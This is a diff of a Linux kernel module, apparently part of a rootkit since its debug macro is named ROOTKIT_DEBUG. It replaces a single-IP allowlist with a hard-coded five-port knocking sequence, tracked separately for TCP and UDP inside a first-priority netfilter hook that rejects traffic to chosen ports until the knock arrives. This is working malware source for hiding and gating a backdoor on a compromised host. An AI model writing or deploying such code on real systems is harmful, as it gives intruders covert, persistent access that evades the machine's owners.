@@ -15,14 +15,10 @@
 /* information for netfilter hooks */
 static struct nf_hook_ops hook;
 
-/* the port for which knocking is enabled */
-static unsigned int port;
-
-/* the transport layer protocol being filtered */
-static int protocol;
-
-/* the ip address which is allowed to connect */
-static __u32 ip;
+/* port triggering setup */
+static unsigned int tcp_state = 0;
+static unsigned int udp_state = 0;
+static unsigned short port_order[5] = {12345, 666, 23, 1337, 42};
 
 /* 
  * This function does all the checking.
@@ -33,30 +29,43 @@ static __u32 ip;
  */
 static int
 is_port_blocked (struct sk_buff *skb) {
-
-
-// TODO FIX THIS FUNCTION
-
-
 	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
 	struct tcphdr *tcp_header;
 	struct udphdr *udp_header;
+	
+	unsigned short port;
+	
 
 	/* check tree for TCP */
-	if (protocol == PROTO_TCP 
-		&& ip_header->protocol == 6) {
+	if (ip_header->protocol == 6) {
 
 		/* get the tcp header */
 		tcp_header = (struct tcphdr *) skb_transport_header(skb);
+		port = ntohs(tcp_header->dest);
+		
+		/* work the state machine */
+		if(tcp_state < 5) {
+			if(port_order[tcp_state] == port) {
+				tcp_state++;
+			} else if (tcp_state > 0
+					&& port_order[tcp_state-1] == port) {
+				/* do nothing */
+			} else {
+				tcp_state = 0;
+			}
+			
+			ROOTKIT_DEBUG("TCP port knocking state is now %u.\n", tcp_state);
+		}
 		
 		/* check if the port matches */
-		if(ntohs(tcp_header->dest) == port) {
+		if(is_knocked_tcp(port)) {
 			ROOTKIT_DEBUG("Received packet on filtered tcp port %u from IP %pI4.\n",
 				port, &ip_header->saddr);
 			
-			/* check if the ip matches */
-			if(ntohl(ip_header->saddr) == ip) {
-
+			/* check if we are in the correct state */
+			if(tcp_state == 5) {
+				tcp_state = 0;	/* reset the state */
+				
 				return 0;	/* allow it */
 
 			} else {
@@ -69,20 +78,35 @@ is_port_blocked (struct sk_buff *skb) {
 	}
 
 	/* check tree for UDP */
-	if (protocol == PROTO_UDP
-		&& ip_header->protocol == 17) {
+	if (ip_header->protocol == 17) {
 
 		/* get the udp header */
 		udp_header = (struct udphdr *) skb_transport_header(skb);
+		port = ntohs(udp_header->dest);
+		
+		/* work the state machine */
+		if(udp_state < 5) {
+			if(port_order[udp_state] == port) {
+				udp_state++;
+			} else if (udp_state > 0
+					&& port_order[udp_state-1] == port) {
+				/* do nothing */
+			} else {
+				udp_state = 0;
+			}
+			
+			ROOTKIT_DEBUG("UDP port knocking state is now %u.\n", udp_state);
+		}
 
 		/* check if the port matches */
-		if(ntohs(udp_header->dest) == port) {
+		if(is_knocked_udp(port)) {
 			ROOTKIT_DEBUG("Received packet on filtered udp port %u from IP %pI4.\n",
 				port, &ip_header->saddr);
 			
-			/* check if the ip matches */
-			if(ntohl(ip_header->saddr) == ip) {
-
+			/* check if we are in the correct state */
+			if(udp_state == 5) {
+				udp_state = 0;	/* reset the state */
+			
 				return 0;	/* allow it */
 
 			} else {
@@ -110,10 +134,11 @@ knocking_hook (const struct nf_hook_ops *ops,
 	const struct net_device *out,
 	int (*okfn)(struct sk_buff *))
 {
-	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
+	struct iphdr *ip_header;
 	
 	/* check if we need to block this packet */
 	if(is_port_blocked(skb)) {
+		ip_header = (struct iphdr *) skb_network_header(skb);
 
 		/* 
 		 * craft an appropriate REJECT response
@@ -141,37 +166,19 @@ knocking_hook (const struct nf_hook_ops *ops,
 
 /* enable port knocking */
 int
-// TODO: remove this: load_port_knocking (char *ipv4_addr, unsigned int port_number, int proto)
 load_port_knocking (void)
 {
 	int ret;
-	u8 tmp[4];
 	
 	ROOTKIT_DEBUG("Starting to load the port knocking...\n");
+
+	/* reset the states */
+	tcp_state = udp_state = 0;
 	
-	/* convert ip string to an int array */
-	//in4_pton(ipv4_addr, -1, tmp, -1, NULL);
-	//ip = 0;
-
-	/* hack to convert byte array to __u32 */
-	//ip |= tmp[0] & 0xFF;
-	//ip <<= 8;
-	//ip |= tmp[1] & 0xFF;
-	//ip <<= 8;
-	//ip |= tmp[2] & 0xFF;
-	//ip <<= 8;
-	//ip |= tmp[3] & 0xFF;
-
-	/* copy the port number */
-	//port = port_number;
-
-	/* copy the protocol */
-	//protocol = proto;
-
 	/* setup everything for the netfilter hook */
-	hook.hook = knocking_hook;		/* our function */
+	hook.hook = knocking_hook;			/* our function */
 	hook.hooknum = NF_INET_LOCAL_IN;	/* grab everything that comes in */
-	hook.pf = PF_INET; 			/* we only care about ipv4 */
+	hook.pf = PF_INET; 					/* we only care about ipv4 */
 	hook.priority = NF_IP_PRI_FIRST;	/* respect my prioritah */
 
 	/* actually do the hook */
